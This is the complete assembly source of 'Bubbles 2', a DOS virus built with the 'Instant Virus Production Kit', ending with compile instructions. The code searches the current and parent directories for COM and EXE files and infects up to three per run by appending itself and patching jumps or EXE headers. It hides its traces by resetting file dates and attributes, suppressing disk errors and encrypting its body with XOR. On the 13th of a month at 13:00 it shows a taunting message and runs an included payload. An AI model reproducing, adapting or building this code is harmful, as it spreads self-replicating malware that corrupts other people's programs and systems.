;---------
;  Bubbles 2 written by Admiral Bailey
;---------


Code    Segment Public 'Code'
        Assume  CS:Code
        Org     100h                              ; All .COM files start here

ID = 'AB'                                         ; Id for infected files
MaxFiles = 3                                      ; Max number of file to infect

Start:
        db     0e9h,2,0                           ; Jump to the next command
        dw     id                                 ; So this file doesnt get infected

Virus:
        call    realcode                          ; Push current location on stack

Realcode:
        pop     bp                                ; Get location off stack
        nop
        nop
        nop
        sub     bp,offset realcode                ; Adjust it for our pointer
        nop
        nop
        call    encrypt_decrypt                   ; Decrypt the virus first

Encrypt_Start   equ     $                         ; From here is encrypted

        cmp     sp,id                             ; Is this file a COM or EXE?
        je      restoreEXE                        ; Its an EXE so restore it

        lea     si,[bp+offset oldjump]            ; Location of old jump in si
        mov     di,100h                           ; Restore new jump to 100h
        push    di                                ; Save so we could just return when done
        movsb                                     ; Move a byte
        movsw                                     ; Move a word
        movsw                                     ; Move another word
        jmp     exitrestore

RestoreEXE:
        push    ds                                ; Save ExE ds
        push    es                                ; Save ExE es
        push    cs
        pop     ds                                ; DS now equals CS
        push    cs
        pop     es                                ; ES now equals CS

        lea     si,[bp+jmpsave2]
        lea     di,[bp+jmpsave]
        movsw                                     ; Move a word
        movsw                                     ; Move a word
        movsw                                     ; Move a word
        movsw                                     ; Move a word

ExitRestore:
        lea     dx,[bp+offset dta]                ; Where to put New DTA
        call    set_DTA                           ; Move it

        mov     [bp+counter],byte ptr 0           ; Clear counter
        mov     ax,3524h                          ; Get int 24 handler
        int     21h                               ; It gets put in ES:BX
        mov     word ptr [bp+oldint24],bx         ; Save it
        mov     word ptr [bp+oldint24+2],es

        mov     ah,25h                            ; Set new int 24 handler
        lea     dx,[bp+offset int24]              ; Loc of new one in DS:DX
        int     21h

        push    cs                                ; Restore ES
        pop     es                                ; 'cuz it was changed

        mov     ah,47h                            ; Get the current directory
        mov     dl,0h                             ; On current drive
        lea     si,[bp+offset currentdir]         ; Where to keep it
        int     21h

DirLoop:
        lea     dx,[bp+offset exefilespec]        ; Files to look for
        call    findfirst
        lea     dx,[bp+offset comfilespec]        ; Files to look for
        call    findfirst

        lea     dx,[bp+offset directory]          ; Where to change too '..'
        mov     ah,3bh                            ; Change directory
        int     21h
        jnc     dirloop                           ; If no problems the look for files

        call    activate                          ; Call the activation routine

        mov     ax,2524h                          ; Restore int 24 handler
        lds     dx,[bp+offset oldint24]           ; To original
        int     21h

        push    cs
        pop     ds                                ; Do this because the DS gets changed

        lea     dx,[bp+offset currentdir]         ; Location Of original dir
        mov     ah,3bh                            ; Change to there
        int     21h

        mov     dx,80h                            ; Location of original DTA
        call    set_dta                           ; Put it back there

        cmp     sp,id-4                           ; Is this file an EXE or COM?
        jz      returnEXE                         ; Its an EXE!

        retn                                      ; Return to 100h (original jump)

ReturnEXE:
        pop     es                                ; Get original ES
        pop     ds                                ; Get original DS

        mov     ax,es
        add     ax,10h
        add     word ptr cs:[bp+jmpsave+2],ax
        add     ax,word ptr cs:[bp+stacksave+2]
        cli                                       ; Clear int's because of stack manipulation
        mov     sp,word ptr cs:[bp+stacksave]
        mov     ss,ax
        sti
        db      0eah                              ; Jump ssss:oooo
jmpsave dd      ?                                 ; Jump location
stacksave dd    ?                                 ; Original cs:ip
jmpsave2 dd     0fff00000h
stacksave2 dd   ?

FindFirst:
        cmp    [bp+counter],maxfiles              ; Have we infected Too many
        ja     quit                               ; Yup

        mov     ah,4eh                            ; Find first file
        mov     cx,7                              ; Find all attributes

FindNext:
        int     21h                               ; Find first/next file int
        jc      quit                              ; If none found then change dir

        call    infection                         ; Infect that file

FindNext2:
        mov     ah,4fh                            ; Find next file
        jmp     findnext                          ; Jump to the loop

Quit:
        ret

Infection:
        mov     ax,3d00h                          ; Open file for read only
        call    open

        mov     ah,3fh                            ; Read from file
        mov     cx,1ah                            ; Number of bytes
        lea     dx,[bp+offset buffer]             ; Location to store them
        int     21h

        mov     ah,3eh                            ; Close file
        int     21h

        mov     ax,word ptr [bp+DTA+1Ah]          ; Get filesize from DTA
        cmp     ax,64000                          ; Is the file too large?
        ja      quitinfect                        ; file to large so getanother

        cmp     ax,600                            ; Is the file too small?
        jb      quitinfect                        ; file to small so getanother

        cmp     word ptr [bp+buffer],'ZM'         ; Is file found an EXE?
        jz      checkEXE                          ; Yup so check it
        mov     ax,word ptr [bp+DTA+35]           ; Get end of file name in ax
        cmp     ax,'DN'                           ; Does it end in 'ND'?
        jz      quitinfect                        ; Yup so get another file

CheckCom:
        mov     bx,word ptr [bp+offset dta+1ah]   ; Get file size
        cmp     word ptr cs:[bp+buffer+3],id      ; Check for ID
        je      quitinfect

        jmp     infectcom

CheckExe:
        cmp     word ptr [bp+buffer+10h],id       ; Check EXE for infection
        jz      quitinfect                        ; Already infected so close up
        jmp     infectexe

QuitInfect:
        ret

InfectCom:
        sub     bx,3                              ; Adjust for new jump
        lea     si,[bp+buffer]                    ; Move the old jump first
        lea     di,[bp+oldjump]
        movsb
        movsw
        movsw
        mov     [bp+buffer],byte ptr 0e9h         ; Setup new jump
        mov     word ptr [bp+buffer+1],bx         ; Save new jump

        mov     word ptr [bp+buffer+3],id         ; Put in ID
        mov     cx,5                              ; Number of bytes to write

        jmp     finishinfection
InfectExe:
        les     ax,dword ptr [bp+buffer+14h]      ; Load es with seg address
        mov     word ptr [bp+jmpsave2],ax         ; save old cs:ip
        mov     word ptr [bp+jmpsave2+2],es

        les     ax,dword ptr [bp+buffer+0eh]      ; save old ss:sp
        mov     word ptr [bp+stacksave2],es       ; save old cs:ip
        mov     word ptr [bp+stacksave2+2],ax

        mov     ax, word ptr [bp+buffer+8]        ; get header size
        mov     cl,4
        shl     ax,cl
        xchg    ax,bx
        les     ax,[bp+offset DTA+26]             ; get files size from dta
        mov     dx,es                             ; its now in dx:ax
        push    ax                                ; save these
        push    dx

        sub     ax,bx                             ; subtract header size from fsize
        sbb     dx,0                              ; subtract the carry too
        mov     cx,10h                            ; convert to segment:offset form
        div     cx

        mov     word ptr [bp+buffer+14h],dx       ; put in new header
        mov     word ptr [bp+buffer+16h],ax       ; cs:ip

        mov     word ptr [bp+buffer+0eh],ax       ; ss:sp
        mov     word ptr [bp+buffer+10h],id       ; put id in for later
        pop     dx                                ; get the file length back
        pop     ax

        add     ax,eof-virus                      ; add virus size
        adc     dx,0                              ; add with carry

        mov     cl,9                              ; calculates new file size
        push    ax
        shr     ax,cl
        ror     dx,cl
        stc
        adc     dx,ax
        pop     ax
        and     ah,1

        mov     word ptr [bp+buffer+4],dx         ; save new file size in header
        mov     word ptr [bp+buffer+2],ax

        push    cs                                ; es = cs
        pop     es

        mov     cx,1ah                            ; Size of EXE header
FinishInfection:
        push    cx                                ; save # of bytes to write
        xor     cx,cx                             ; Set attriutes to none
        call    attributes

        mov     al,2                              ; open file read/write
        call    open

        mov     ah,40h                            ; Write to file
        lea     dx,[bp+buffer]                    ; Location of bytes
        pop     cx                                ; Get number of bytes to write
        int     21h
        jc      closefile

        mov     al,02                             ; Move Fpointer to eof
        Call    move_fp

get_time:
        mov     ah,2ch                            ; Get time for encryption value
        int     21h
        cmp     dh,0                              ; If its seconds are zero get another
        je      get_time
        mov     [bp+enc_value],dh                 ; Use seconds value for encryption

        call    encrypt_infect                    ; Encrypt and infect the file

        inc     [bp+counter]                      ; Increment the counter

CloseFile:
        mov     ax,5701h                          ; Set files date/time back
        mov     cx,word ptr [bp+dta+16h]          ; Get old time from dta
        mov     dx,word ptr [bp+dta+18h]          ; Get old date
        int     21h

        mov     ah,3eh                            ; Close file
        int     21h

        xor     cx,cx
        mov     cl,byte ptr [bp+dta+15h]          ; Get old Attributes
        call    attributes

        retn

Activate:
        mov     ah,2ah                            ; Get current date
        int     21h

        cmp     cx,1993                           ; Check current Year
        jb      dont_activate
        cmp     dl,13                             ; Check current Day
        jne     dont_activate

        mov     ah,2ch                            ; Get current time
        int     21h

        cmp     ch,13                             ; Check current hour 
        jne     dont_activate

        mov     ah,9                              ; Display string
        lea     dx,[bp+messege]                   ; The string to display
        int     21h

        mov     cx,2
        include .\routines\phasor.rtn             ; Include file

Dont_Activate:
        ret

Move_Fp:
        mov     ah,42h                            ; Move file pointer
        xor     cx,cx                             ; Al has location
        xor     dx,dx                             ; Clear these
        int     21h
        retn

Set_DTA:
        mov     ah,1ah                            ; Move the DTA location
        int     21h                               ; DX has location
        retn

Open:
        mov     ah,3dh                            ; open file
        lea     dx,[bp+DTA+30]                    ; Filename in DTA
        int     21h
        xchg    ax,bx                             ; put file handle in bx
        ret

Attributes:
        mov     ax,4301h                          ; Set attributes to cx
        lea     dx,[bp+DTA+30]                    ; filename in DTA
        int     21h
        ret

int24:                                            ; New Int 24h
        mov     al,3                              ; Fail call
        iret                                      ; Return from int 24 call

Virusname db 'Bubbles 2'                          ; Name Of The Virus
Author    db 'Admiral Bailey'                     ; Author Of This Virus
messege:
          db 'Bubbles 2 : Its back and better then ever.',10,13
          db '            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^',10,13
          db 'Is it me or does that Make no sense at all?',10,13
Made_with db '[IVP2]',10,13,'$'                    ; Please do not remove this

comfilespec  db  '*.com',0                        ; Holds type of file to look for
exefilespec  db  '*.exe',0                        ; Holds type of file to look for
directory    db '..',0                            ; Directory to change to
oldjump      db  0cdh,020h,0,0,0                  ; Old jump.  Is int 20h for file quit

Encrypt_Infect:
        lea     si,[bp+offset move_begin]         ; Location of where to move from
        lea     di,[bp+offset workarea]           ; Where to move it too
        mov     cx,move_end-move_begin            ; Number of bytes to move
move_loop:
        movsb                                     ; Moves this routine into heap
        loop    move_loop
        lea     dx,[bp+offset workarea]
        call    dx                                ; Jump to that routine just moved
        ret

Move_Begin    equ     $                           ; Marks beginning of move
        push    bx                                ; Save the file handle
        lea     dx,[bp+offset encrypt_end]
        call    dx                                ; Call the encrypt_decrypt procedure
        pop     bx                                ; Get handle back in bx and return
        mov     ah,40h                            ; Write to file
        mov     cx,eof-virus                      ; Number of bytes
        lea     dx,[bp+offset virus]              ; Where to write from
        int     21h
        push    bx                                ; Save the file handle
        lea     dx,[bp+offset encrypt_end]
        call    dx                                ; Decrypt the file and return
        pop     bx                                ; Get handle back in bx and return
        ret
move_end      equ     $                           ; Marks the end of move

Encrypt_End   equ     $                           ; Marks the end of encryption

Encrypt_Decrypt:
        mov     cx,encrypt_end-encrypt_start      ; bytes to encrypt
        lea     si,cs:[bp+encrypt_start]          ; start of encryption
        mov     di,si
encloop:
        lodsb
        xor     ah,cs:[bp+enc_value]
        stosb
        loop    encloop
        ret

Enc_Value     db    00h                           ; Hold the encryption value 00 for nul effect

EOF     equ     $                                 ; Marks the end of file

Counter db 0                                      ; Infected File Counter
Workarea db     move_end-move_begin dup (?)       ; Holds the encrypt_infect routine
currentdir db   64 dup (?)                        ; Holds the current dir
DTA     db      42 dup (?)                        ; Location of new DTA
Buffer db 1ah dup (?)                             ; Holds exe header
OldInt24 dd ?                                     ; Storage for old int 24h handler
Filler   db  3000 dup (0)

eov     equ     $                                 ; Used For Calculations

code    ends
        end     start


;---------
;  Instant Virus Production Kit By Admiral Bailey - Youngsters Against McAfee
;  To compile this use TASM /M FILENAME.ASM
;  Then type tlink /t FILENAME.OBJ
;---------

